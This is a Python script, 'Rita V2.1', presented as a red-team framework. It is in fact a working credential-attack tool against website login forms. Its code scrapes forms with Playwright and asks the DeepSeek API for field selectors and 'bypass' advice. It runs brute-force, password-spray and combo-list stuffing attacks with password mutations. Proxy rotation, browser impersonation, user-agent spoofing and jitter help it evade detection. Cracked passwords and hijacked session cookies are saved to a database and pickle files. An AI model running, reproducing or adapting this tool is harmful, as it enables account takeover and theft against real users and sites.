#!/usr/bin/env python3
# This project By Gogo & Disha ®
"""
============================================================================
Rita V2.1 Unlimited ® (Android Ubuntu PRoot Hardened) - RED-TEAM FRAMEWORK
Features:
- Automatic DISPLAY environment variable injection for Termux/PRoot environments
- Dynamic Form Action Extraction & URL Resolution (urllib.parse.urljoin)
- True Session Cookie & Auth Token Extraction with Pickle State Serialization
- Comprehensive CSRF Token Extraction and Malicious Injection (Headers & Payload)
- AI Error Handling Feedback Loop via DeepSeek API Flash for Auto-Reverification
- Playwright Automation with PRoot-compatible headless/headful argument flags
- Multi-Mode Attack Engine (Brute, Spray, Combos) with 4 Mutation Engines
- Zero SyntaxWarnings (Raw Strings) & Zero AttributeErrors (Explicit Dest)
============================================================================
"""

import argparse
import concurrent.futures
import json
import os
import pickle
import random
import re
import sqlite3
import string
import sys
import time
from urllib.parse import parse_qsl, urlencode, urljoin, urlsplit, urlunsplit
from datetime import datetime
from itertools import product

# --- PROOT / ANDROID DISPLAY ENVIRONMENT FIX ---
if "DISPLAY" not in os.environ:
    os.environ["DISPLAY"] = ":0"

# --- OPTIONAL DEPENDENCY IMPORTS ---
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    import base64
    HAS_CRYPTOGRAPHY = True
except ImportError:
    HAS_CRYPTOGRAPHY = False

try:
    from curl_cffi import requests as cffi_requests
    HAS_CFFI = True
except ImportError:
    HAS_CFFI = False

try:
    import requests
except ImportError:
    requests = None

try:
    from playwright.sync_api import sync_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False

from tqdm import tqdm

DB_NAME = "bruteforce1.db"

def init_database():
    """Initializes SQLite database tables for profiles, sessions, tokens, leaks, and successful matches."""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute(r"""
        CREATE TABLE IF NOT EXISTS form_profiles (
            url TEXT PRIMARY KEY,
            form_action TEXT,
            user_field TEXT,
            pass_field TEXT,
            submit_field TEXT,
            csrf_field TEXT,
            csrf_value TEXT,
            failure_signature TEXT,
            session_cookie TEXT,
            baseline_length INTEGER,
            failed_length INTEGER,
            timestamp TEXT
        )
    """)
    migrations = [
        ("form_action", "TEXT"),
        ("submit_field", "TEXT"),
        ("csrf_field", "TEXT"),
        ("csrf_value", "TEXT"),
        ("failure_signature", "TEXT"),
        ("session_cookie", "TEXT"),
        ("baseline_length", "INTEGER"),
        ("failed_length", "INTEGER")
    ]
    for col_name, col_type in migrations:
        try:
            cursor.execute(f"ALTER TABLE form_profiles ADD COLUMN {col_name} {col_type}")
        except sqlite3.OperationalError:
            pass

    cursor.execute(r"""
        CREATE TABLE IF NOT EXISTS captured_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            username TEXT,
            session_token TEXT,
            cookies TEXT,
            timestamp TEXT
        )
    """)
    cursor.execute(r"""
        CREATE TABLE IF NOT EXISTS analysis_leaks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            scraped_content TEXT,
            timestamp TEXT
        )
    """)
    cursor.execute(r"""
        CREATE TABLE IF NOT EXISTS success_matches (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            username TEXT,
            password TEXT,
            response_snippet TEXT,
            timestamp TEXT
        )
    """)
    conn.commit()
    conn.close()

def save_form_profile(url, form_action, user_field, pass_field, submit_field, csrf_field, csrf_value, failure_signature, session_cookie, baseline_length, failed_length):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute(r"""
        INSERT OR REPLACE INTO form_profiles (url, form_action, user_field, pass_field, submit_field, csrf_field, csrf_value, failure_signature, session_cookie, baseline_length, failed_length, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (str(url), str(form_action), str(user_field), str(pass_field), str(submit_field), str(csrf_field), str(csrf_value), str(failure_signature), str(session_cookie), int(baseline_length), int(failed_length), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def load_form_profile(url):
    if not os.path.exists(DB_NAME):
        return None
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute(r"SELECT form_action, user_field, pass_field, submit_field, csrf_field, csrf_value, failure_signature, session_cookie, baseline_length, failed_length FROM form_profiles WHERE url = ?", (str(url),))
    row = cursor.fetchone()
    conn.close()
    if row:
        return {
            "formAction": str(row[0] or url),
            "userField": str(row[1] or "username"),
            "passField": str(row[2] or "password"),
            "submitField": str(row[3] or "input[type='submit']"),
            "csrfField": str(row[4] or "csrf_token"),
            "csrfVal": str(row[5] or ""),
            "failureSignature": str(row[6] or "invalid"),
            "sessionCookie": str(row[7] or ""),
            "baselineLength": int(row[8]) if row[8] is not None else 0,
            "failedLength": int(row[9]) if row[9] is not None else 0
        }
    return None

def save_captured_session(url, username, token, cookies):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute(r"INSERT INTO captured_sessions (url, username, session_token, cookies, timestamp) VALUES (?, ?, ?, ?, ?)", (str(url), str(username), str(token), str(cookies), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def save_leak_data(url, content):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute(r"INSERT INTO analysis_leaks (url, scraped_content, timestamp) VALUES (?, ?, ?)", (str(url), str(content[:2000]), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def save_success_match(url, username, password, snippet):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute(r"INSERT INTO success_matches (url, username, password, response_snippet, timestamp) VALUES (?, ?, ?, ?, ?)", (str(url), str(username), str(password), str(snippet[:500]), datetime.now().isoformat()))
    conn.commit()
    conn.close()

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
]

def load_user_agents(agent_path):
    if not agent_path or not os.path.exists(agent_path):
        return DEFAULT_USER_AGENTS
    try:
        with open(agent_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
        return lines if lines else DEFAULT_USER_AGENTS
    except Exception:
        return DEFAULT_USER_AGENTS

def load_proxies(proxy_path):
    if not proxy_path or not os.path.exists(proxy_path):
        return []
    try:
        with open(proxy_path, 'r', encoding='utf-8', errors='ignore') as f:
            proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return proxies
    except Exception:
        return []

class DeepSeekAIInterface:
    @staticmethod
    def query_deepSeek(api_key, prompt, context_data=""):
        if not api_key:
            return None
        endpoint = "https://api.deepseek.com/v1/chat/completions"
        headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
        payload = {
            "model": "deepseek-chat",
            "messages": [
                {"role": "system", "content": "You are an expert security automation assistant. Output strictly valid JSON with keys: userField, passField, submitField, csrfField, failureSignature, formAction."},
                {"role": "user", "content": f"{prompt}\n\nContext:\n{str(context_data)[:4000]}"}
            ],
            "temperature": 0.1
        }
        try:
            if HAS_CFFI:
                resp = cffi_requests.post(endpoint, headers=headers, json=payload, timeout=20)
            elif requests is not None:
                resp = requests.post(endpoint, headers=headers, json=payload, timeout=20)
            else:
                return None
            if resp.status_code == 200:
                data = resp.json()
                return str(data['choices'][0]['message']['content'])
        except Exception:
            pass
        return None

    @classmethod
    def analyze_dom_with_ai(cls, api_key, html_content):
        prompt = (
            "Analyze the following login form HTML DOM. Extract and return a JSON object with CSS selectors or input names for: "
            "'userField', 'passField', 'submitField', 'csrfField', 'failureSignature', and the form 'formAction'."
        )
        res = cls.query_deepSeek(api_key, prompt, html_content)
        if res:
            try:
                clean_json = re.sub(r'```json|```', '', str(res)).strip()
                parsed = json.loads(clean_json)
                return {str(k): str(v) for k, v in parsed.items()}
            except Exception:
                pass
        return None

    @classmethod
    def handle_error_with_ai(cls, api_key, error_msg, response_body):
        prompt = f"An error or challenge occurred during authentication verification. Error: {error_msg}. Response snippet: {response_body[:500]}. Provide corrective advice or regex adjustment for bypass."
        res = cls.query_deepSeek(api_key, prompt)
        return str(res) if res else "No AI advice available."

class AttackEngine:
    @staticmethod
    def toggle_case(word):
        w = str(word)
        return [''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(w)),
                ''.join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(w))]

    @staticmethod
    def generate_mutations(base_words, engine_type='dictionary', mask_pattern=''):
        mutations = set()
        for word in base_words:
            w = str(word).strip()
            if not w:
                continue
            if engine_type == 'dictionary':
                mutations.add(w)
            elif engine_type == 'toggle':
                mutations.add(w)
                mutations.update(AttackEngine.toggle_case(w))
            elif engine_type == 'hybrid':
                mutations.add(w)
                suffixes = ['123', '!', '2026', '@123', '#', '1234']
                for s in suffixes:
                    mutations.add(w + s)
                    mutations.add(s + w)
            elif engine_type == 'mask' and mask_pattern:
                char_map = {'?l': string.ascii_lowercase, '?u': string.ascii_uppercase, '?d': string.digits, '?s': string.punctuation}
                parts, i = [], 0
                mp = str(mask_pattern)
                while i < len(mp):
                    if mp[i:i+2] in char_map:
                        parts.append(char_map[mp[i:i+2]])
                        i += 2
                    else:
                        parts.append(mp[i])
                        i += 1
                for combo in product(*parts):
                    mutations.add(w + "".join(combo))
        return list(mutations)

def stage_analyze_url_playwright(url, api_key, show_browser):
    init_database()
    target_url = str(url)
    print(r".-.-.-.-</L\O/V\E/\P/L\I/N\Y/\L/O\V/E>-.-.-.-.")
    print(f"[+] Rita V2.1 PRoot Stage 1: Analyzing target -> {target_url}")

    if not HAS_PLAYWRIGHT:
        print("[-] Playwright not installed. Falling back to static profile defaults.")
        return None

    clean_len = 0
    failed_len = 0
    form_action = target_url
    user_sel = "input[name*='user'], input[name*='email'], input[type='email']"
    pass_sel = "input[name*='pass'], input[type='password']"
    submit_sel = "button[type='submit'], input[type='submit']"
    csrf_sel = "input[name*='csrf'], input[name*='token']"
    failure_sig = "invalid credentials"
    session_cookie = ""
    test_user = "fake_test_user_12345@example.com"

    with sync_playwright() as p:
        # Force headless mode if show_browser is false or if DISPLAY environment causes issues in PRoot
        is_headless = not show_browser
        browser = p.firefox.launch(
            headless=is_headless,
            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
        )
        context = browser.new_context()
        page = context.new_page()
        try:
            page.goto(target_url, timeout=30000)
            page.wait_for_load_state("networkidle", timeout=10000)
        except Exception as e:
            print(f"[-] Navigation warning: {e}")

        html = page.content()
        clean_len = len(html)
        save_leak_data(target_url, html)

        try:
            form_el = page.query_selector("form")
            if form_el:
                action_attr = form_el.get_attribute("action")
                if action_attr:
                    form_action = urljoin(target_url, action_attr)
        except Exception:
            pass

        csrf_val = ""
        try:
            csrf_el = page.query_selector(csrf_sel)
            if csrf_el:
                csrf_val = csrf_el.get_attribute("value") or ""
        except Exception:
            pass

        ai_selectors = DeepSeekAIInterface.analyze_dom_with_ai(api_key, html)
        if ai_selectors:
            user_sel = ai_selectors.get("userField", user_sel)
            pass_sel = ai_selectors.get("passField", pass_sel)
            submit_sel = ai_selectors.get("submitField", submit_sel)
            csrf_sel = ai_selectors.get("csrfField", csrf_sel)
            failure_sig = ai_selectors.get("failureSignature", failure_sig)
            if ai_selectors.get("formAction"):
                form_action = urljoin(target_url, ai_selectors.get("formAction"))

        try:
            u_el = page.query_selector(user_sel)
            p_el = page.query_selector(pass_sel)
            s_el = page.query_selector(submit_sel)
            if u_el: u_el.fill(test_user)
            if p_el: p_el.fill("WrongTestPass123!@#")
            if s_el:
                s_el.click()
                page.wait_for_load_state("networkidle", timeout=8000)
        except Exception:
            pass

        failed_html = page.content()
        failed_len = len(failed_html)

        cookies = context.cookies()
        session_cookie = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
        browser.close()

    save_form_profile(target_url, form_action, user_sel, pass_sel, submit_sel, csrf_sel, csrf_val, failure_sig, session_cookie, clean_len, failed_len)
    print(f"[+] Stage 1 Complete. Form Action resolved: {form_action}")
    print(f"[+] Profile committed to bruteforce1.db for {target_url}")
    return {
        "url": target_url,
        "formAction": form_action,
        "userField": user_sel,
        "passField": pass_sel,
        "submitField": submit_sel,
        "csrfField": csrf_sel,
        "failureSignature": failure_sig,
        "sessionCookie": session_cookie,
        "csrfVal": csrf_val,
        "baselineLength": clean_len,
        "failedLength": failed_len
    }

def validate_response(body_text, status_code, dom_threshold, baseline_length, custom_failure_sig=""):
    lower = str(body_text).lower()
    success_indicators = ['dashboard', 'welcome', 'account', 'logout', 'my profile', 'control panel', 'admin']
    has_success = any(ind in lower for ind in success_indicators)

    failures = ['invalid credentials', 'incorrect password', 'wrong password', 'authentication failed', 'login failed', 'access denied', 'bad credentials']
    custom_failure_sig = str(custom_failure_sig).strip().lower()
    if custom_failure_sig:
        failures.append(custom_failure_sig)

    for f in failures:
        if f in lower:
            return False, f"False Positive (Failure signature matched: '{f}')"

    if int(status_code) != 200:
        return False, "Non-200 Status"

    if has_success:
        return True, "Valid True Positive (Dashboard/Welcome signature detected)"

    if dom_threshold > 0 and baseline_length > 0:
        variance = abs(len(str(body_text)) - int(baseline_length)) / float(baseline_length)
        threshold = float(dom_threshold)
        if variance >= threshold:
            return True, f"Valid True Positive (DOM variance met: {variance:.2f})"
        return False, f"DOM Anomaly Threshold Unmet (Variance: {variance:.2f})"

    return False, "No success signature or DOM anomaly detected"

def send_request(url, user, password, method, data_type, cookie, csrf, timeout, user_agents, profile, max_depth, show_browser, dom_threshold, ai_key, proxy_pool):
    timestamp = datetime.now().isoformat()
    agent = str(random.choice(user_agents))

    safe_user = str(user) if user is not None else ""
    safe_password = str(password) if password is not None else ""

    decoded_pass = safe_password
    decode_secret = os.environ.get("RITA_DECODE_SECRET", "")
    if HAS_CRYPTOGRAPHY and max_depth > 0 and decode_secret:
        try:
            salt = b'rita_v2_salt'
            kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100)
            key = base64.urlsafe_b64encode(kdf.derive(decode_secret.encode("utf-8")))
            f = Fernet(key)
            for _ in range(min(max_depth, 5)):
                decoded_pass = f.decrypt(decoded_pass.encode('utf-8')).decode('utf-8')
        except Exception:
            pass

    target_url = profile.get("formAction", url)
    headers = {
        "User-Agent": agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }

    final_cookie = str(profile.get("sessionCookie", "")) + ("; " + str(cookie) if cookie else "")
    if final_cookie and final_cookie != 'N/A':
        headers["Cookie"] = final_cookie

    resolved_csrf = str(csrf) if csrf else str(profile.get("csrfVal", ""))
    if resolved_csrf:
        headers["X-CSRF-Token"] = resolved_csrf
        headers["X-CSRFToken"] = resolved_csrf

    user_f = profile.get("userField", "username")
    pass_f = profile.get("passField", "password")
    csrf_f = profile.get("csrfField", "csrf_token")
    fail_sig = profile.get("failureSignature", "invalid")

    req_data, req_json = None, None
    meth = str(method).upper()
    dt = str(data_type).lower()

    if meth in ['POST', 'PUT']:
        if dt == 'json':
            headers["Content-Type"] = "application/json"
            req_json = {user_f: safe_user, pass_f: decoded_pass}
            if resolved_csrf:
                req_json[csrf_f] = resolved_csrf
        else:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            req_data = {user_f: safe_user, pass_f: decoded_pass}
            if resolved_csrf:
                req_data[csrf_f] = resolved_csrf
    else:
        parts = urlsplit(target_url)
        query = dict(parse_qsl(parts.query, keep_blank_values=True))
        query[str(user_f)] = safe_user
        query[str(pass_f)] = decoded_pass
        if resolved_csrf:
            query[str(csrf_f)] = resolved_csrf
        target_url = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(query), parts.fragment))

    proxy = random.choice(proxy_pool) if proxy_pool else None
    proxies = {"http": str(proxy), "https": str(proxy)} if proxy else None

    try:
        if HAS_CFFI:
            if meth == 'POST':
                resp = cffi_requests.post(target_url, headers=headers, data=req_data, json=req_json, timeout=int(timeout), proxies=proxies, impersonate="chrome120")
            elif meth == 'PUT':
                resp = cffi_requests.put(target_url, headers=headers, data=req_data, json=req_json, timeout=int(timeout), proxies=proxies, impersonate="chrome120")
            else:
                resp = cffi_requests.get(target_url, headers=headers, timeout=int(timeout), proxies=proxies, impersonate="chrome120")
        elif requests is not None:
            if meth == 'POST':
                resp = requests.post(target_url, headers=headers, data=req_data, json=req_json, timeout=int(timeout), proxies=proxies)
            elif meth == 'PUT':
                resp = requests.put(target_url, headers=headers, data=req_data, json=req_json, timeout=int(timeout), proxies=proxies)
            else:
                resp = requests.get(target_url, headers=headers, timeout=int(timeout), proxies=proxies)
        else:
            raise RuntimeError("No HTTP client is available; install requests or curl-cffi")

        body_text = str(resp.text)
        status = int(resp.status_code)
        is_valid, msg = validate_response(body_text, status, float(dom_threshold), int(profile.get("baselineLength", 0)), fail_sig)

        extracted_session_token = resp.cookies.get_dict().get("sessionid") or resp.cookies.get_dict().get("token") or "ACTIVE_SESSION_OBTAINED"
        response_cookies = "; ".join([f"{k}={v}" for k, v in resp.cookies.items()])

        if not is_valid and ai_key and status >= 400:
            ai_advice = DeepSeekAIInterface.handle_error_with_ai(ai_key, msg, body_text)
            msg += f" | AI Error Insight: {ai_advice[:100]}"

        return {
            "url": target_url, "user": safe_user, "password": safe_password, "decoded": decoded_pass,
            "status": status, "length": len(body_text), "is_valid": is_valid, "msg": str(msg),
            "timestamp": timestamp, "snippet": body_text[:300], "sessionToken": extracted_session_token,
            "responseCookies": response_cookies, "error": None
        }
    except Exception as e:
        err_str = str(e).lower()
        is_timeout = 'timeout' in err_str or isinstance(e, TimeoutError)
        return {
            "url": target_url, "user": safe_user, "password": safe_password, "decoded": decoded_pass,
            "status": 0, "length": 0, "is_valid": False, "msg": "Error",
            "timestamp": timestamp, "snippet": "", "sessionToken": "", "responseCookies": "",
            "error": "Timeout" if is_timeout else str(e)
        }

def main():
    parser = argparse.ArgumentParser(description="Rita V2.1 PRoot Unlimited ®")
    parser.add_argument("-url", default="", dest="url", help="Single Target URL")
    parser.add_argument("-urls.txt", default="", dest="urls_file", help="Path to file containing multiple URLs")
    parser.add_argument("-mode", default="analyze", dest="mode", choices=["analyze", "brute", "spray", "combos"], help="Operation mode")
    parser.add_argument("-user", default="", dest="user", help="Single target username")
    parser.add_argument("-users.txt", default="", dest="users_file", help="Path to users file")
    parser.add_argument("-pass.txt", default="", dest="pass_file", help="Path to password wordlist")
    parser.add_argument("-combos.txt", default="", dest="combos_file", help="Path to combos file")
    parser.add_argument("-proxy-file", default="", dest="proxy_file", help="Path to proxy list")
    parser.add_argument("-engine", default="dictionary", dest="engine", choices=["dictionary", "hybrid", "mask", "toggle"])
    parser.add_argument("-mask", default="", dest="mask")
    parser.add_argument("-th", type=int, default=10, dest="threads")
    parser.add_argument("-jitt", type=float, default=0.0, dest="jitter")
    parser.add_argument("-method", default="POST", dest="method", choices=["GET", "POST", "PUT"])
    parser.add_argument("-datatype", default="form", dest="datatype", choices=["json", "form", "url"])
    parser.add_argument("-cookie", default="", dest="cookie")
    parser.add_argument("-csrf", default="", dest="csrf")
    parser.add_argument("-timeout", type=int, default=10, dest="timeout")
    parser.add_argument("-agent", default="", dest="agent")
    parser.add_argument("-success-exit", action="store_true", dest="success_exit")
    parser.add_argument("-force-retry", action="store_true", dest="force_retry")
    parser.add_argument("-show-browser", action="store_true", dest="show_browser", help="Show browser headful view")
    parser.add_argument("-dom-threshold", type=float, default=0.0, dest="dom_threshold")
    parser.add_argument("--ai-key", default=os.environ.get("DEEPSEEK_API_KEY", ""), dest="ai_key", help="DeepSeek API Key")
    parser.add_argument("--max-decode-depth", type=int, default=3, dest="max_decode_depth")

    args = parser.parse_args()
    if args.threads < 1:
        parser.error("-th must be at least 1")
    if args.timeout < 1:
        parser.error("-timeout must be at least 1")
    if args.dom_threshold < 0:
        parser.error("-dom-threshold cannot be negative")
    if args.max_decode_depth < 0:
        parser.error("--max-decode-depth cannot be negative")
    user_agents = load_user_agents(args.agent)
    proxy_pool = load_proxies(args.proxy_file)

    print(r".-.-.-.-</L\O/V\E/\P/L\I/N\Y/\L/O\V/E>-.-.-.-.")
    print(r"Rita V2.1 PRoot Unlimited ® - Initialized Engine")
    print(r"BUCKLE UP! Running robust execution pipeline...")

    init_database()

    target_urls = []
    if args.urls_file and os.path.exists(str(args.urls_file)):
        with open(str(args.urls_file), 'r', encoding='utf-8', errors='ignore') as f:
            target_urls = [str(l).strip() for l in f if str(l).strip()]
    elif args.url:
        target_urls = [str(args.url)]

    if not target_urls:
        print(r"[-] Error: No target URLs provided via -url or -urls.txt")
        sys.exit(1)

    if args.mode == "analyze":
        for u in target_urls:
            stage_analyze_url_playwright(u, args.ai_key, args.show_browser)
        print(r"[+] Stage 1 Analysis Complete. All profiles committed to bruteforce1.db.")
        sys.exit(0)

    tasks = []
    for target_url in target_urls:
        profile = load_form_profile(target_url)
        if not profile:
            print(r"[!] No profile in DB for " + target_url + ". Running Playwright analysis...")
            profile = stage_analyze_url_playwright(target_url, args.ai_key, args.show_browser)

        if not profile:
            continue

        if args.mode == 'combos':
            combo_path = str(args.combos_file)
            if not os.path.exists(combo_path):
                print(r"[-] Combos file not found: " + combo_path)
                continue
            with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if ':' in line:
                        u, p = line.strip().split(':', 1)
                        tasks.append((target_url, str(u), str(p), profile))
        elif args.mode == 'spray':
            if not args.users_file or not args.pass_file:
                print(r"[-] Spray mode requires -users.txt and -pass.txt")
                sys.exit(1)
            with open(str(args.users_file), 'r', encoding='utf-8', errors='ignore') as f:
                users = [str(l).strip() for l in f if str(l).strip()]
            with open(str(args.pass_file), 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [str(l).strip() for l in f if str(l).strip()]
            mutated_passwords = AttackEngine.generate_mutations(passwords, args.engine, args.mask)
            for pwd in mutated_passwords:
                for u in users:
                    tasks.append((target_url, str(u), str(pwd), profile))
        else: # brute
            if not args.user or not args.pass_file:
                print(r"[-] Brute mode requires -user and -pass.txt")
                sys.exit(1)
            with open(str(args.pass_file), 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [str(l).strip() for l in f if str(l).strip()]
            mutated_passwords = AttackEngine.generate_mutations(passwords, args.engine, args.mask)
            for pwd in mutated_passwords:
                tasks.append((target_url, str(args.user), str(pwd), profile))

    total_tasks = len(tasks)
    print(f"[+] Total generated task permutations: {total_tasks}")
    if total_tasks == 0:
        print(r"[-] Task queue empty. Exiting.")
        sys.exit(0)

    print(r"[+] Executing Stage 2 Attack Pool with AI & bruteforce1.db integration...\n")
    start_time = time.time()
    successes, false_positives, timeouts, errors = 0, 0, 0, 0

    def worker_task(item):
        t_url, u, pwd, prof = item
        if args.jitter > 0:
            time.sleep(max(0.01, random.gauss(float(args.jitter), float(args.jitter) / 3.0)))
        res = send_request(
            t_url, u, pwd, args.method, args.datatype, args.cookie, args.csrf,
            args.timeout, user_agents, prof, args.max_decode_depth,
            args.show_browser, args.dom_threshold, args.ai_key, proxy_pool
        )
        if res["error"] == "Timeout" and args.force_retry:
            res = send_request(
                t_url, u, pwd, args.method, args.datatype, args.cookie, args.csrf,
                args.timeout, user_agents, prof, args.max_decode_depth,
                args.show_browser, args.dom_threshold, args.ai_key, proxy_pool
            )
        return res

    with concurrent.futures.ThreadPoolExecutor(max_workers=int(args.threads)) as executor:
        futures = {executor.submit(worker_task, task): task for task in tasks}

        with tqdm(total=total_tasks, desc=r"[+] Rita V2.1 PRoot Progress", ncols=100) as pbar:
            for future in concurrent.futures.as_completed(futures):
                try:
                    res = future.result()
                except Exception as exc:
                    errors += 1
                    tqdm.write(f"[!] Worker error: {exc}")
                    pbar.update(1)
                    continue
                pbar.update(1)

                if res["error"] == "Timeout":
                    timeouts += 1
                elif res["error"]:
                    errors += 1
                elif res["status"] == 200:
                    if res["is_valid"]:
                        successes += 1
                        save_success_match(res["url"], res["user"], res["password"], res["snippet"])
                        save_captured_session(res["url"], res["user"], res["sessionToken"], res["responseCookies"])

                        safe_username = re.sub(r"[^A-Za-z0-9_-]+", "_", str(res["user"])).strip("_") or "unknown"
                        session_dump_filename = f"rita_session_{safe_username}.pkl"
                        with open(session_dump_filename, 'wb') as pkl_file:
                            pickle.dump({"url": res["url"], "user": res["user"], "token": res["sessionToken"], "cookies": res["responseCookies"]}, pkl_file)

                        tqdm.write(f"\n[!] SUCCESS MATCH FOUND -> URL: {res['url']} | User: {res['user']} | Pass: {res['password']}")
                        tqdm.write(f"[+] Active Session Token captured & pickled to {session_dump_filename}")

                        if args.success_exit:
                            tqdm.write(r"[+] -success-exit triggered. Aborting remaining tasks.")
                            executor.shutdown(wait=False, cancel_futures=True)
                            break
                    else:
                        false_positives += 1

    duration = time.time() - start_time
    print(r".-.-.-.-</L\O/V\E/\P/L\I/N\Y/\L/O\V/E>-.-.-.-.")
    print(r"Rita V2.1 PRoot Unlimited ® - Execution Summary:")
    print(f"    - Duration: {duration:.2f} seconds")
    print(f"    - Total Tested: {total_tasks}")
    print(f"    - True Positive Matches: {successes}")
    print(f"    - False Positives Filtered: {false_positives}")
    print(f"    - Timeouts: {timeouts}")
    print(f"    - Errors: {errors}")
    print(r"[+] All records, session tokens, and pickled states securely committed to bruteforce1.db")
    print(r".-.-.-.-</L\O/V\E/\P/L\I/N\Y/\L/O\V/E>-.-.-.-.")

if __name__ == '__main__':
    main()
